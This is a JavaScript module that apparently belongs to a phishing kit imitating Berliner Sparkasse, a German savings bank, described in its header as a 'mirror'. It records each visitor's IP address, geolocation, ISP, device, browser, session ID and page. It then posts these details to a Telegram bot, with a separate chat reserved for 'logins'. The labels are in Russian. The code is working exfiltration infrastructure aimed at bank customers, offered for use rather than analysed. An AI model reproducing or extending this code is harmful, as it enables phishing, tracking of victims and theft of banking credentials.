/**
 * Telegram notifications for Berliner Sparkasse mirror.
 */
import { fetch as undiciFetch } from 'undici';

export function telegramConfig() {
  return {
    botToken: process.env.TELEGRAM_BOT_TOKEN || '',
    chatId: process.env.TELEGRAM_CHAT_ID || '',
    loginsChatId: process.env.TELEGRAM_LOGINS_CHAT_ID || '',
    enabled: process.env.TELEGRAM_NOTIFY !== '0',
  };
}

const geoCache = new Map();
const GEO_TTL_MS = 10 * 60 * 1000;

export function escHtml(s) {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

export function getClientIp(req) {
  const fwd = req.headers['x-forwarded-for'];
  if (typeof fwd === 'string' && fwd.length) return fwd.split(',')[0].trim();
  const real = req.headers['x-real-ip'];
  if (typeof real === 'string' && real.length) return real.trim();
  const addr = req.socket?.remoteAddress || '';
  return addr.replace(/^::ffff:/, '');
}

function isPrivateIp(ip) {
  if (!ip || ip === '::1' || ip === '127.0.0.1' || ip === 'localhost') return true;
  if (ip.startsWith('10.') || ip.startsWith('192.168.') || ip.startsWith('172.')) return true;
  if (ip.startsWith('fc') || ip.startsWith('fd') || ip.startsWith('fe80')) return true;
  return false;
}

export function parseUserAgent(ua) {
  const s = ua || 'Unknown';
  let device = '🖥 Desktop';
  if (/mobile|android|iphone|ipod|blackberry|iemobile|opera mini/i.test(s)) device = '📱 Mobile';
  else if (/ipad|tablet|playbook|silk/i.test(s)) device = '📲 Tablet';

  let os = 'Unknown';
  if (/windows nt 10/i.test(s)) os = 'Windows 10/11';
  else if (/windows/i.test(s)) os = 'Windows';
  else if (/mac os x/i.test(s)) os = 'macOS';
  else if (/android/i.test(s)) os = 'Android';
  else if (/iphone|ipad|ipod/i.test(s)) os = 'iOS';
  else if (/linux/i.test(s)) os = 'Linux';

  let browser = 'Unknown';
  if (/edg\//i.test(s)) browser = 'Edge';
  else if (/chrome\//i.test(s) && !/edg/i.test(s)) browser = 'Chrome';
  else if (/firefox\//i.test(s)) browser = 'Firefox';
  else if (/safari\//i.test(s) && !/chrome/i.test(s)) browser = 'Safari';

  return { device, os, browser, raw: s };
}

async function lookupGeo(ip) {
  if (isPrivateIp(ip)) {
    return { city: '—', region: 'Local', country: '—', isp: '—' };
  }
  const cached = geoCache.get(ip);
  if (cached && Date.now() - cached.at < GEO_TTL_MS) return cached.geo;

  try {
    const url = `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,regionName,city,isp,query`;
    const res = await undiciFetch(url, { signal: AbortSignal.timeout(8000) });
    const data = await res.json();
    const geo =
      data.status === 'success'
        ? {
            city: data.city || '—',
            region: data.regionName || '—',
            country: data.country || '—',
            isp: data.isp || '—',
          }
        : { city: '—', region: '—', country: '—', isp: '—' };
    geoCache.set(ip, { at: Date.now(), geo });
    return geo;
  } catch {
    return { city: '—', region: '—', country: '—', isp: '—' };
  }
}

export function formatLocation(geo) {
  return [geo.city, geo.region, geo.country].filter((x) => x && x !== '—').join(', ') || '—';
}

/** @param {import('node:http').IncomingMessage} req */
export async function getUserContext(req) {
  const ip = getClientIp(req);
  const ua = req.headers['user-agent'] || '';
  const parsed = parseUserAgent(ua);
  const geo = await lookupGeo(ip);
  return { ip, ua, parsed, geo, location: formatLocation(geo) };
}

export function formatUserBlock(ctx, extra = {}) {
  const lines = [
    `🌐 <b>IP:</b> <code>${escHtml(ctx.ip)}</code>`,
    `📍 <b>Локация:</b> ${escHtml(ctx.location)}`,
    `🏢 <b>ISP:</b> ${escHtml(ctx.geo.isp)}`,
    `${ctx.parsed.device} · ${escHtml(ctx.parsed.os)} · ${escHtml(ctx.parsed.browser)}`,
  ];
  if (extra.sessionId) lines.push(`🔑 <b>Сессия:</b> <code>${escHtml(extra.sessionId)}</code>`);
  if (extra.page) lines.push(`📄 <b>Страница:</b> <code>${escHtml(extra.page)}</code>`);
  return lines.join('\n');
}

export async function sendTelegram(text, chatId) {
  const { botToken, chatId: defaultChatId, enabled } = telegramConfig();
  if (!enabled) return false;
  const target = chatId || defaultChatId;
  if (!botToken || !target) {
    console.warn('[telegram] TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set');
    return false;
  }

  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  const res = await undiciFetch(url, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      chat_id: target,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    }),
    signal: AbortSignal.timeout(15000),
  });

  const data = await res.json();
  if (!data.ok) throw new Error(data.description || 'Telegram API error');
  return true;
}
